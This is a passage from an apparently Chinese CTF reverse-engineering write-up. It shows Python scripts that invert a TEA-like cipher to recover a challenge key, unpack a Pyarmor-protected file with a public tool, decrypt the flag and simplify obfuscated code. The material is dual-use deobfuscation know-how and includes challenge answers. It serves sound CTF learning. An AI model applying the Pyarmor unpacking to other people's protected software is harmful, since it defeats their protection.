汇编字节码已保存到: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;用法: python <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;file.pyc&gt; [output.txt]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    pyc_path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    output_path = sys.argv[<span class="number">2</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">    decompile_pyc(pyc_path, output_path)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3.13环境下运行得到字节码</p><p>接下来就到了AI时间，ds解出正确的key</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">changli_inv</span>(<span class="params">L, R, o0o0o3</span>):</span><br><span class="line">    <span class="comment"># 逆向changli函数</span></span><br><span class="line">    o0o0o4 = <span class="number">2269471011</span></span><br><span class="line">    o0o0o5 = o0o0o3 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o6 = ((o0o0o3 &gt;&gt; <span class="number">8</span>) ^ <span class="number">305419896</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o7 = ((o0o0o3 &lt;&lt; <span class="number">4</span>) ^ <span class="number">2271560481</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o8 = ((o0o0o3 &gt;&gt; <span class="number">12</span>) ^ <span class="number">2882400000</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 生成轮密钥</span></span><br><span class="line">    keys = []</span><br><span class="line">    o0o0o11 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        o0o0o11 = (o0o0o11 + o0o0o4) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        keys.append(o0o0o11)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 逆向Feistel网络</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        o0o0o11 = keys[i]</span><br><span class="line">        <span class="comment"># 逆向右半部分</span></span><br><span class="line">        R_prev = (R - (((L &lt;&lt; <span class="number">4</span>) + o0o0o7) ^ (L + o0o0o11) ^ ((L &gt;&gt; <span class="number">4</span>) + o0o0o8))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="comment"># 逆向左半部分</span></span><br><span class="line">        L_prev = (L - (((R_prev &lt;&lt; <span class="number">4</span>) + o0o0o5) ^ (R_prev + o0o0o11) ^ ((R_prev &gt;&gt; <span class="number">4</span>) + o0o0o6))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        L, R = L_prev, R_prev</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> L, R</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Carlotta_inv</span>(<span class="params">output_P, output_Q, o0oE, o0oF</span>):</span><br><span class="line">    <span class="comment"># 逆向Carlotta函数</span></span><br><span class="line">    o0oH = <span class="number">305419896</span></span><br><span class="line">    o0oI = o0oE &amp; <span class="number">0xFFFF</span></span><br><span class="line">    o0oJ = (o0oE &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    o0oK = (o0oE ^ o0oF) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    o0oL = ((o0oE &gt;&gt; <span class="number">8</span>) ^ o0oF) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    o0oM = (o0oH * (o0oF + <span class="number">1</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二轮逆向</span></span><br><span class="line">    o0oN2 = (((output_P &lt;&lt; <span class="number">5</span>) + o0oK) ^ (output_P + o0oM) ^ ((output_P &gt;&gt; <span class="number">5</span>) + o0oL)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0oD = (output_Q - o0oN2) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第一轮逆向</span></span><br><span class="line">    o0oN1 = (((o0oD &lt;&lt; <span class="number">5</span>) + o0oI) ^ (o0oD + o0oM) ^ ((o0oD &gt;&gt; <span class="number">5</span>) + o0oJ)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0oC = (output_P - o0oN1) &amp; <span class="number">0xFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> o0oC, o0oD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_original_input</span>():</span><br><span class="line">    <span class="comment"># 目标输出</span></span><br><span class="line">    target = [<span class="number">105084753</span>, <span class="number">3212558540</span>, <span class="number">351342182</span>, <span class="number">844102737</span>, <span class="number">2002504052</span>, <span class="number">356536456</span>, <span class="number">2463183122</span>, <span class="number">615034880</span>, <span class="number">1156203296</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤1: 逆向changli操作链</span></span><br><span class="line">    <span class="comment"># 从后往前逆向changli操作</span></span><br><span class="line">    state = target.copy()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 逆向8轮changli操作</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        L_prev, R_prev = changli_inv(state[i], state[i+<span class="number">1</span>], <span class="number">2025</span>)</span><br><span class="line">        state[i] = L_prev</span><br><span class="line">        state[i+<span class="number">1</span>] = R_prev</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤2: 逆向Carlotta和Shorekeeper操作</span></span><br><span class="line">    original_input = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="comment"># 从state[j]中提取Carlotta的输出</span></span><br><span class="line">        output_P = (state[j] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        output_Q = state[j] &amp; <span class="number">0xFFFF</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Carlotta函数的参数</span></span><br><span class="line">        o0oE = j + <span class="number">2025</span>  <span class="comment"># 索引 + 2025</span></span><br><span class="line">        o0oF = j * j     <span class="comment"># 索引的平方</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 逆向Carlotta得到Shorekeeper的输出</span></span><br><span class="line">        o0oC, o0oD = Carlotta_inv(output_P, output_Q, o0oE, o0oF)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 合并得到原始输入</span></span><br><span class="line">        original_val = (o0oC &lt;&lt; <span class="number">16</span>) | o0oD</span><br><span class="line">        original_input.append(original_val)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> original_input</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算原始key</span></span><br><span class="line">original_key = find_original_input()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始key:&quot;</span>, original_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证结果</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_solution</span>(<span class="params">input_key</span>):</span><br><span class="line">    <span class="comment"># 重新实现shouan函数来验证</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(input_key) != <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;需要输入9个key&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    o0o0o35 = []</span><br><span class="line">    <span class="keyword">for</span> o0o0o49, o0o0o34 <span class="keyword">in</span> <span class="built_in">enumerate</span>(input_key):</span><br><span class="line">        o0o0o33 = o0o0o49 * o0o0o49</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Shorekeeper操作</span></span><br><span class="line">        o0o0o13 = o0o0o34 &gt;&gt; <span class="number">16</span></span><br><span class="line">        o0o0o14 = o0o0o34 &amp; <span class="number">0xFFFF</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Carlotta操作</span></span><br><span class="line">        o0oE = o0o0o49 + <span class="number">2025</span></span><br><span class="line">        o0oF = o0o0o33</span><br><span class="line">        </span><br><span class="line">        o0oH = <span class="number">305419896</span></span><br><span class="line">        o0oI = o0oE &amp; <span class="number">0xFFFF</span></span><br><span class="line">        o0oJ = (o0oE &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        o0oK = (o0oE ^ o0oF) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        o0oL = ((o0oE &gt;&gt; <span class="number">8</span>) ^ o0oF) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        o0oM = (o0oH * (o0oF + <span class="number">1</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">        o0oN = (((o0o0o14 &lt;&lt; <span class="number">5</span>) + o0oI) ^ (o0o0o14 + o0oM) ^ ((o0o0o14 &gt;&gt; <span class="number">5</span>) + o0oJ)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        o0oP = (o0o0o13 + o0oN) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        </span><br><span class="line">        o0oN = (((o0oP &lt;&lt; <span class="number">5</span>) + o0oK) ^ (o0oP + o0oM) ^ ((o0oP &gt;&gt; <span class="number">5</span>) + o0oL)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        o0oQ = (o0o0o14 + o0oN) &amp; <span class="number">0xFFFF</span></span><br><span class="line">        </span><br><span class="line">        o0o0o40 = (o0oP &lt;&lt; <span class="number">16</span>) | o0oQ</span><br><span class="line">        o0o0o35.append(o0o0o40)</span><br><span class="line">    </span><br><span class="line">    o0o0o41 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        L, R = changli(o0o0o35[i], o0o0o35[i+<span class="number">1</span>], <span class="number">2025</span>)</span><br><span class="line">        o0o0o35[i] = L</span><br><span class="line">        o0o0o35[i+<span class="number">1</span>] = R</span><br><span class="line">        o0o0o41.append(L)</span><br><span class="line">    </span><br><span class="line">    o0o0o41.append(o0o0o35[<span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> o0o0o41</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新定义changli函数用于验证</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changli</span>(<span class="params">o0o0o1, o0o0o2, o0o0o3</span>):</span><br><span class="line">    o0o0o4 = <span class="number">2269471011</span></span><br><span class="line">    o0o0o5 = o0o0o3 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o6 = ((o0o0o3 &gt;&gt; <span class="number">8</span>) ^ <span class="number">305419896</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o7 = ((o0o0o3 &lt;&lt; <span class="number">4</span>) ^ <span class="number">2271560481</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o8 = ((o0o0o3 &gt;&gt; <span class="number">12</span>) ^ <span class="number">2882400000</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o9 = o0o0o1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o10 = o0o0o2 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    o0o0o11 = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        o0o0o11 = (o0o0o11 + o0o0o4) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        o0o0o9 = (o0o0o9 + (((o0o0o10 &lt;&lt; <span class="number">4</span>) + o0o0o5) ^ (o0o0o10 + o0o0o11) ^ ((o0o0o10 &gt;&gt; <span class="number">4</span>) + o0o0o6))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        o0o0o10 = (o0o0o10 + (((o0o0o9 &lt;&lt; <span class="number">4</span>) + o0o0o7) ^ (o0o0o9 + o0o0o11) ^ ((o0o0o9 &gt;&gt; <span class="number">4</span>) + o0o0o8))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (o0o0o9, o0o0o10)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;验证结果:&quot;</span>, verify_solution(original_key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;目标输出:&quot;</span>, [<span class="number">105084753</span>, <span class="number">3212558540</span>, <span class="number">351342182</span>, <span class="number">844102737</span>, <span class="number">2002504052</span>, <span class="number">356536456</span>, <span class="number">2463183122</span>, <span class="number">615034880</span>, <span class="number">1156203296</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;验证通过:&quot;</span>, verify_solution(original_key) == [<span class="number">105084753</span>, <span class="number">3212558540</span>, <span class="number">351342182</span>, <span class="number">844102737</span>, <span class="number">2002504052</span>, <span class="number">356536456</span>, <span class="number">2463183122</span>, <span class="number">615034880</span>, <span class="number">1156203296</span>])</span><br></pre></td></tr></table></figure><p>key是1234, 5678, 9123, 4567, 8912, 3456, 7891, 2345, 6789</p><p>另一个文件src打开很明显的pyarmor，但是PY头被删了，补上PY000000</p><p><a href="https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot">https://github.com/Lil-House/Pyarmor-Static-Unpack-1shot</a></p><p>命令<code>python shot.py &quot;D:\download\2025-ycb\附件\src&quot;</code></p><p><img src="/2025/10/22/%E5%85%B3%E4%BA%8Epython%E9%80%86%E5%90%91/image-20251027090251931.png" alt="image-20251027090251931"></p><p>再用之前的key解出flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line">    <span class="number">1473</span>, <span class="number">3419</span>, <span class="number">9156</span>, <span class="number">1267</span>, <span class="number">9185</span>, <span class="number">2823</span>, <span class="number">7945</span>, <span class="number">618</span>, <span class="number">7036</span>, <span class="number">2479</span>,</span><br><span class="line">    <span class="number">5791</span>, <span class="number">1945</span>, <span class="number">4639</span>, <span class="number">1548</span>, <span class="number">3634</span>, <span class="number">3502</span>, <span class="number">2433</span>, <span class="number">1407</span>, <span class="number">1263</span>, <span class="number">3354</span>,</span><br><span class="line">    <span class="number">9274</span>, <span class="number">1085</span>, <span class="number">8851</span>, <span class="number">3022</span>, <span class="number">8031</span>, <span class="number">734</span>, <span class="number">6869</span>, <span class="number">2644</span>, <span class="number">5798</span>, <span class="number">1862</span>,</span><br><span class="line">    <span class="number">4745</span>, <span class="number">1554</span>, <span class="number">3523</span>, <span class="number">3631</span>, <span class="number">2512</span>, <span class="number">1499</span>, <span class="number">1221</span>, <span class="number">3226</span>, <span class="number">9237</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">fuck_key = [<span class="number">1234</span>, <span class="number">5678</span>, <span class="number">9123</span>, <span class="number">4567</span>, <span class="number">8912</span>, <span class="number">3456</span>, <span class="number">7891</span>, <span class="number">2345</span>, <span class="number">6789</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 __</span></span><br><span class="line">__ = [k % <span class="number">0xFF</span> <span class="keyword">for</span> k <span class="keyword">in</span> fuck_key]  <span class="comment"># 0xFF is 255</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 init 函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>(<span class="params">key, key_len</span>):</span><br><span class="line">    var0 = <span class="number">0</span></span><br><span class="line">    box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        var0 = (var0 + box[i] + key[i % key_len]) % <span class="number">256</span></span><br><span class="line">        box[i], box[var0] = box[var0], box[i]</span><br><span class="line">    <span class="keyword">return</span> box</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义 make 函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make</span>(<span class="params">box</span>):</span><br><span class="line">    var2 = <span class="number">0</span></span><br><span class="line">    var0 = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        var2 = (var2 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        var0 = (var0 + box[var2]) % <span class="number">256</span></span><br><span class="line">        box[var2], box[var0] = box[var0], box[var2]</span><br><span class="line">        index = (box[var2] + box[var0] + i % <span class="number">23</span>) % <span class="number">256</span></span><br><span class="line">        result.append(box[index])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成密钥流</span></span><br><span class="line">key_bytes = <span class="built_in">bytes</span>(__)</span><br><span class="line">box_init = init(key_bytes, <span class="built_in">len</span>(key_bytes))</span><br><span class="line">key_stream = make(box_init)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在解密</span></span><br><span class="line">flag_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        _ = fuck_key[i % <span class="number">9</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        _ = (fuck_key[i % <span class="number">9</span>] * <span class="number">2</span>) % <span class="number">0xFFF</span>  <span class="comment"># 0xFFF is 4095</span></span><br><span class="line">    plain_byte = cipher[i] ^ (key_stream[i] + _)</span><br><span class="line">    flag_list.append(plain_byte)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将flag_list转换为字节串</span></span><br><span class="line">flag_bytes = <span class="built_in">bytes</span>(flag_list)</span><br><span class="line"><span class="built_in">print</span>(flag_bytes)</span><br></pre></td></tr></table></figure><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>plus.py很明显被混淆了，试版本发现是3.9</p><p>用脚本把加法算出来</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simplify_additions_in_file</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># 读取原始代码</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        code = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 匹配类似 int(7 + 7 + 9 + 3) 这样的表达式</span></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&quot;int\(([\d+\s+]+)\)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace_expr</span>(<span class="params"><span class="keyword">match</span></span>):</span><br><span class="line">        expr = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 计算加法的实际结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(expr)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;int(<span class="subst">&#123;result&#125;</span>)&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">0</span>)  <span class="comment"># 出错就原样返回</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行替换</span></span><br><span class="line">    optimized_code = re.sub(pattern, replace_expr, code)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存优化后的结果</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(optimized_code)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;已优化完成，结果保存到 <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例</span></span><br><span class="line">simplify_additions_in_file(<span class="string">&quot;plus.py&quot;</span>, <span class="string">&quot;optimized.py&quot;</span>)</span><br></pre></td></tr></table></figure><p>再优化一下换行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># optimize_and_prettify.py</span></span><br><span class="line"><span class="comment"># 用途：将单行混淆 Python 脚本拆行并把 int(...) 加法计算成数字</span></span><br><span class="line"><span class="comment"># 说明：保守替换——只计算由纯数字构成的 int(...) 加法片段，遇到空 int() 或非纯数字的 int(...) 会保留原样。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">optimize_int_sums</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将连续的 int(NUM)+int(NUM)+... 替换成它们的和（数字字符串）。</span></span><br><span class="line"><span class="string">    只匹配完全由 int(decimal) 构成的序列；不会触碰空的 int() 或含变量的 int(x)。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 匹配类似 int(123) + int(456) + int(7)</span></span><br><span 